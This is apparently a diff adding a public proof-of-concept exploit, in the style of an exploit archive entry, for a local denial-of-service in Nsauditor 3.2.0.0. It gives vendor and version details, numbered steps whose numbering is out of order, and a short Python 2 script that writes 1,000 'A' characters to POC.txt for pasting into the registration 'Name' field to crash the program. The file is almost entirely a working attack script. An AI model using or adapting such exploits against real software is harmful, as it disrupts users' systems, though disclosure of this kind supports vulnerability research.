@@ -1,0 +1,39 @@
+# Exploit Title: Nsauditor 3.2.0.0 - 'Name' Denial of Service (PoC)
+# Discovery by: 0xMoHassan
+# Date: 2020-04-04
+# Vendor Homepage: http://www.nsauditor.com
+# Software Link: http://www.nsauditor.com/downloads/nsauditor_setup.exe
+# Tested Version: 3.2.0.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows XP - SP3
+
+# About App
+# Nsauditor Network Security Auditor is a powerful network security tool designed to scan networks and hosts for vulnerabilities, 
+# and to provide security alerts.Nsauditor network auditor checks enterprise network for all potential methods that 
+# a hacker might use to attack it and create a report of potential problems that were found , Nsauditor network auditing 
+# software significantly reduces the total cost of network management in enterprise environments by enabling 
+# IT personnel and systems administrators gather a wide range of information from all the computers in the network without 
+# installing server-side applications on these computers and create a report of potential problems that were found.
+
+
+# PoC
+# 1.Run the python script, it will create a new file "POC.txt"
+# 3.Run Nsauditor and click on "Register -> Enter Registration Code"
+# 2.Paste the content of POC.txt into the Field: 'Name'
+# 6.click 'ok'
+# 5.Magic happen :)
+
+
+
+#!/usr/bin/env python
+buff = "\x41" *500
+buff += "\x41" * 500
+
+try:
+    f=open("POC.txt","w")
+    print "[+] Creating %s bytes payload.." %len(buff)
+    f.write(buff)
+    f.close()
+    print "[+] POC created!"
+except:
+    print "POC cannot be created"
